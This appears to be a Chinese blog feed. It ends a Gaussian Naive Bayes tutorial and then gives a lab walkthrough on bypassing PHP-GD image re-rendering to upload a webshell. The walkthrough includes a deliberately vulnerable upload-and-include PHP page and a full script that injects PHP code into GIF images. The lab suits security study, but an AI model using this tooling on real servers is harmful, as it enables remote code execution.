class="line">namelist_train</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>shuffle功能</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, shuffle=<span class="literal">False</span>)</span><br><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><h4 id="1-4-使用高斯模型训练数据集"><a href="#1-4-使用高斯模型训练数据集" class="headerlink" title="1.4 使用高斯模型训练数据集"></a>1.4 使用高斯模型训练数据集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># training the model on training set </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#引入高斯朴素贝叶斯</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB </span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">gnb = GaussianNB() </span><br><span class="line"><span class="comment">#训练数据 fit相当于train</span></span><br><span class="line">gnb.fit(X_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>GaussianNB(priors=None, var_smoothing=1e-09)</code></pre><h4 id="1-5-测试集预测"><a href="#1-5-测试集预测" class="headerlink" title="1.5 测试集预测"></a>1.5 测试集预测</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># making predictions on the testing set </span></span><br><span class="line">y_pred = gnb.predict(X_test)</span><br></pre></td></tr></table></figure><h4 id="1-6-比较预测值和实际值"><a href="#1-6-比较预测值和实际值" class="headerlink" title="1.6 比较预测值和实际值"></a>1.6 比较预测值和实际值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># comparing actual response values (y_test) with predicted response values (y_pred) </span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics </span><br><span class="line">print(<span class="string">"Gaussian Naive Bayes model accuracy(in %):"</span>, metrics.accuracy_score(y_test, y_pred)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><pre><code>Gaussian Naive Bayes model accuracy(in %): 93.33333333333333</code></pre><ul><li>sklearn.metrics中的评估方法介绍（<a href="https://blog.csdn.net/cherdw/article/details/55813071）" target="_blank" rel="noopener">https://blog.csdn.net/cherdw/article/details/55813071）</a></li></ul><h4 id="1-7-完整代码"><a href="#1-7-完整代码" class="headerlink" title="1.7 完整代码"></a>1.7 完整代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load the iris dataset </span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris </span><br><span class="line">iris = load_iris() </span><br><span class="line"></span><br><span class="line"><span class="comment"># store the feature matrix (X) and response vector (y) </span></span><br><span class="line">X = iris.data </span><br><span class="line">y = iris.target </span><br><span class="line"></span><br><span class="line"><span class="comment"># splitting X and y into training and testing sets </span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split </span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.3</span>, random_state=<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># training the model on training set </span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB </span><br><span class="line">gnb = GaussianNB() </span><br><span class="line">gnb.fit(X_train, y_train) </span><br><span class="line"></span><br><span class="line"><span class="comment"># making predictions on the testing set </span></span><br><span class="line">y_pred = gnb.predict(X_test) </span><br><span class="line"></span><br><span class="line"><span class="comment"># comparing actual response values (y_test) with predicted response values (y_pred) </span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics </span><br><span class="line">print(<span class="string">"Gaussian Naive Bayes model accuracy(in %):"</span>, metrics.accuracy_score(y_test, y_pred)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><pre><code>Gaussian Naive Bayes model accuracy(in %): 93.33333333333333</code></pre>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
          <category> 机器学习算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> GaussianNB </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（五）：高级利用】5.1 图片重绘</title>
      <link href="2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/"/>
      <url>2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>重绘图的概念</li><li>图片重绘实例分析，PHP输出图像函数</li></ul><a id="more"></a><h3 id="0x01-重绘图"><a href="#0x01-重绘图" class="headerlink" title="0x01 重绘图"></a>0x01 重绘图</h3><blockquote><p>应用调用图片库对上传的图片进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用常规方法上传webshell.</p></blockquote><ul><li><p>如何绕过</p><ul><li>将正常图片用目标使用的图像库进行转换</li><li>寻找转换前后两次未变的部分</li><li>将未变部分替换为欲上传的WebShell</li><li>将替换后的文件进行图像文件转换，看是否转换后仍存在替换后部分</li></ul></li><li><p>比如：</p><p>  转换前：1233333abcdefg[1111222333]sdas213</p><p>  转换后：xsadssdddsdddd[1111222333]2313322</p></li></ul><h3 id="0x02-实战练习"><a href="#0x02-实战练习" class="headerlink" title="0x02 实战练习"></a>0x02 实战练习</h3><ul><li>参考代码地址<br><a href="https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE" target="_blank" rel="noopener">https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</a></li></ul><h4 id="2-1-部署"><a href="#2-1-部署" class="headerlink" title="2.1 部署"></a>2.1 部署</h4><ul><li>将参考代码地址项目下载，并放置在windows+phpstudy WWW目录下，并访问，部署完成状态<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload01.png" alt=""></li></ul><h4 id="2-2-上传代码"><a href="#2-2-上传代码" class="headerlink" title="2.2 上传代码"></a>2.2 上传代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;This is a quick demo to show the process of bypass PHP-GD.&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;Choose image to upload, then <span class="string">"include $upload_path;"</span> to show some data.&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;<span class="keyword">or</span>, <span class="keyword">use</span> <span class="title">parameter</span> "<span class="title">file</span>" <span class="title">to</span> <span class="title">include</span> <span class="title">file</span>, <span class="title">e</span>.<span class="title">g</span>. <span class="title">http</span>://<span class="title">xxxxx</span>/<span class="title">index</span>.<span class="title">php</span>?<span class="title">file</span>=&amp;<span class="title">lt</span>;something&amp;gt;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gd_process</span><span class="params">($src_img, $dst_img)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># you can redefine the GD process</span></span><br><span class="line">        $im = imagecreatefromgif($src_img);</span><br><span class="line">        imagegif($im, $dst_img);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        printf(<span class="string">"%s\n"</span>, $e-&gt;getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"upfile"</span>])) &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $img_info = getimagesize($temp_file);</span><br><span class="line">    <span class="keyword">if</span> ($img_info[<span class="number">2</span>] == <span class="string">'1'</span>) &#123;</span><br><span class="line">        $upload_file = <span class="string">"test.gif"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!gd_process($temp_file, $upload_file)) &#123;</span><br><span class="line">            printf(<span class="string">"Image upload process error, please check out.\n"</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(<span class="string">"Path: %s, image upload successful!\n"</span>, $upload_file);</span><br><span class="line">        <span class="keyword">include</span> $upload_file;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printf(<span class="string">"Image type not support in this demo, GIF please...\n"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">"file"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>imagecreatefromgif()</code>函数</p><blockquote><ul><li>由文件或 URL 创建一个新图象</li><li>描述：<code>imagecreatefromgif ( string $filename )</code>返回一图像标识符，代表了从给定的文件名取得的图像</li></ul></blockquote></li><li><p>PHP 输出图像</p><ul><li><code>imagegif()、imagejpeg()、imagepng() 和 imagewbmp()</code>函数分别允许以 GIF、JPEG、PNG 和 WBMP 格式将图像输出到浏览器或文件。</li><li>语法：<blockquote><ul><li><code>bool imagegif ( resource image [, string filename] )</code></li><li><code>bool imagejpeg ( resource image [, string filename [, int quality]] )</code></li><li><code>bool imagepng ( resource image [, string filename] )</code></li><li><code>bool imagewbmp ( resource image [, string filename [, int foreground]] )</code></li></ul></blockquote></li><li>参数说明：<blockquote><ul><li>image    欲输出的图像资源，如 imagecreate() 或 imagecreatefrom 系列函数的返回值</li><li>filename    可选，指定输出图像的文件名。如果省略，则原始图像流将被直接输出。</li><li>quality    可选，指定图像质量，范围从 0（最差质量，文件最小）到 100（最佳质量，文件最大），默认75 ，imagejpeg() 独有参数</li><li>foreground    可选，指定前景色，默认前景色是黑色，imagewbmp() 独有参数</li></ul></blockquote></li></ul></li></ul><h4 id="2-3-上传利用copy制作的图片木马"><a href="#2-3-上传利用copy制作的图片木马" class="headerlink" title="2.3 上传利用copy制作的图片木马"></a>2.3 上传利用copy制作的图片木马</h4><ul><li><p>图片demotest.gif 含phpinfo()WebShell，测试结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload02.png" alt=""></p></li><li><p>分析上传成功的test.gif和demotest.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload03.png" alt=""></p></li></ul><h4 id="2-4-图片转换代码"><a href="#2-4-图片转换代码" class="headerlink" title="2.4 图片转换代码"></a>2.4 图片转换代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: rickchen.vip(at)gmail.com</span></span><br><span class="line"><span class="comment"> * Date: 2015-04-05</span></span><br><span class="line"><span class="comment"> * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE</span></span><br><span class="line"><span class="comment"> * Reference: http://www.secgeek.net/bookfresh-vulnerability/</span></span><br><span class="line"><span class="comment"> * Usage: php codeinj.php demo.gif "&lt;?php phpinfo();?&gt;"</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gd_process</span><span class="params">($src_img, $dst_img)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># you can redefine the GD process</span></span><br><span class="line">        $im = imagecreatefromgif($src_img);</span><br><span class="line">        imagegif($im, $dst_img);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        printf(<span class="string">"%s\n"</span>, $e-&gt;getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_similar_block</span><span class="params">($src_img, $dst_img, $block_len, $slow=false)</span> </span>&#123;</span><br><span class="line">    $src_data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line">    $dst_data = fread(fopen($dst_img, <span class="string">"rb"</span>), filesize($dst_img));</span><br><span class="line">    $src_index = <span class="number">0</span>;</span><br><span class="line">    $pre_match_array = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($src_index &lt; (strlen($src_data) - $block_len)) &#123;</span><br><span class="line">        $find_data = substr($src_data, $src_index, $block_len);</span><br><span class="line"></span><br><span class="line">        $dst_index = <span class="number">0</span>;</span><br><span class="line">        $found = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span> ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123;</span><br><span class="line">            $temp_data = substr($dst_data, $dst_index, $block_len);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> === strcmp($find_data, $temp_data)) &#123;</span><br><span class="line">                $match = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">"src_offset"</span> =&gt; $src_index,</span><br><span class="line">                    <span class="string">"dst_offset"</span> =&gt; $dst_index</span><br><span class="line">                );</span><br><span class="line">                $pre_match_array[] = $match;</span><br><span class="line">                $found = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                printf("Similar block found&gt; src_offset: %d\n", $src_index);</span></span><br><span class="line"><span class="comment">                printf("                     dst_offset: %d\n", $dst_index);</span></span><br><span class="line"><span class="comment">                printf("                   similar_data: %s\n", str2hex($temp_data));</span></span><br><span class="line"><span class="comment">                printf("                 similar_length: %s\n\n", strlen($temp_data));</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($found &amp;&amp; $slow == <span class="keyword">false</span>)</span><br><span class="line">                $dst_index += $block_len;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $dst_index++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($found &amp;&amp; $slow == <span class="keyword">false</span>)</span><br><span class="line">            $src_index += $block_len;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $src_index++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $pre_match_array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inject_code_to_src_img</span><span class="params">($src_img, $pre_match_array, $injection_code)</span> </span>&#123;</span><br><span class="line">    $src_data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line">    $inj_len = strlen($injection_code);</span><br><span class="line"></span><br><span class="line">    $find_n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($pre_match_array <span class="keyword">as</span> $similar_block) &#123;</span><br><span class="line">        <span class="comment">#printf("Trying inject code to source image with offset: %d, length: %d\n", $similar_block["src_offset"], $inj_len);</span></span><br><span class="line">        $mod_src_data = substr($src_data, <span class="number">0</span>, $similar_block[<span class="string">"src_offset"</span>]).$injection_code.substr($src_data, $similar_block[<span class="string">"src_offset"</span>] + $inj_len);</span><br><span class="line">        $temp_img = sys_get_temp_dir().<span class="string">"/"</span>.$src_img.<span class="string">".mod"</span>;</span><br><span class="line">        $temp_cvt_img = $temp_img.<span class="string">".gd"</span>;</span><br><span class="line">        fwrite(fopen($temp_img, <span class="string">"wb"</span>), $mod_src_data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!gd_process($temp_img, $temp_cvt_img)) &#123;</span><br><span class="line">            <span class="comment">#printf("PHP-GD process() the image modified error, offset: %d\n", $similar_block["src_offset"]);</span></span><br><span class="line">            <span class="comment">#printf("                                           length: %d\n\n", $inj_len);</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (check_code($temp_cvt_img, $injection_code)) &#123;</span><br><span class="line">                $fuck_img = <span class="string">"gd_"</span>.$src_img;</span><br><span class="line">                fwrite(fopen($fuck_img, <span class="string">"wb"</span>), $mod_src_data);</span><br><span class="line">                printf(<span class="string">"Inject code to source image successful with offset: %d\n"</span>, $similar_block[<span class="string">"src_offset"</span>]);</span><br><span class="line">                printf(<span class="string">"Saving result \"%s\", have fun! :)\n"</span>, $fuck_img);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">#printf("Modified image doesn't work well, offset: %d, retry...\n", $similar_block["src_offset"]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_code</span><span class="params">($src_img, $injection_code)</span> </span>&#123;</span><br><span class="line">    $data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strpos($data, $injection_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2hex</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $hex = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $hex .= sprintf(<span class="string">"%02x"</span>, (ord($str[$i])));;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex2str</span><span class="params">($hex)</span></span>&#123;</span><br><span class="line">    $str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($hex)<span class="number">-1</span>; $i+=<span class="number">2</span>)&#123;</span><br><span class="line">        $str .= chr(hexdec($hex[$i].$hex[$i+<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* main */</span></span><br><span class="line"><span class="keyword">if</span> ($argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    printf(<span class="string">"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\n"</span>, $argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$slow = <span class="keyword">false</span>;</span><br><span class="line">$src_img = $argv[<span class="number">1</span>];</span><br><span class="line">$injection_code = $argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">$img_info = getimagesize($src_img);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GIF image type value "1" */</span></span><br><span class="line"><span class="keyword">if</span> ($img_info[<span class="number">2</span>] == <span class="string">'1'</span>) &#123;</span><br><span class="line">    $cvt_img = sys_get_temp_dir().<span class="string">"/"</span>.basename($src_img);</span><br><span class="line">    <span class="keyword">if</span> (!gd_process($src_img, $cvt_img)) &#123;</span><br><span class="line">        printf(<span class="string">"PHP-GD process() function error, please check out.\n"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printf(<span class="string">"This script only support GIF image.\n"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$block_len = strlen($injection_code);</span><br><span class="line">$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sizeof($pre_match_array)) &#123;</span><br><span class="line">    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printf(<span class="string">"Not found any similar %d bytes block.\n"</span>, strlen($injection_code));</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">"Cant find any useful similar block to inject code, but take it easy. :(\n"</span>);</span><br></pre></td></tr></table></figure><h4 id="2-5-使用图片转换代码，转换代码"><a href="#2-5-使用图片转换代码，转换代码" class="headerlink" title="2.5 使用图片转换代码，转换代码"></a>2.5 使用图片转换代码，转换代码</h4><ul><li><p>转换操作如图<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload04.png" alt=""></p></li><li><p>查看demo.gif,经过转换后的gd_demo.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload05.png" alt=""></p></li></ul><h4 id="2-6-上传2-5转换后的图片gd-demo-gif"><a href="#2-6-上传2-5转换后的图片gd-demo-gif" class="headerlink" title="2.6 上传2.5转换后的图片gd_demo.gif"></a>2.6 上传2.5转换后的图片gd_demo.gif</h4><ul><li><p>测试结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload06.png" alt=""></p></li><li><p>再次分析gd_demo.gif和上传成功的test.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload07.png" 